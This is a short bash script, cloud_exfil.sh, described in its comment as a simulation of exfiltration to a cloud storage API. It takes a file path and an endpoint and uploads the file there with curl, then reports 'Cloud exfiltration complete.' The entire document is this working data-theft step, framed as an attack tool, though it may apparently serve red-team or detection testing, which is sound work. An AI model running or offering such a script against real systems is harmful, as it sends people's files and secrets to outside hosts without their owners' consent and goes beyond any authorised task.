#!/bin/bash
# cloud_exfil.sh - Simulate exfiltration to a cloud storage API using curl.
if [ "$#" -ne 2 ]; then
  echo "Usage: $0 <file> <cloud_api_endpoint>"
  exit 1
fi
FILE="$1"
API_ENDPOINT="$2"
echo "Uploading $FILE to cloud at $API_ENDPOINT..."
curl -F "file=@$FILE" "$API_ENDPOINT"
echo "Cloud exfiltration complete."
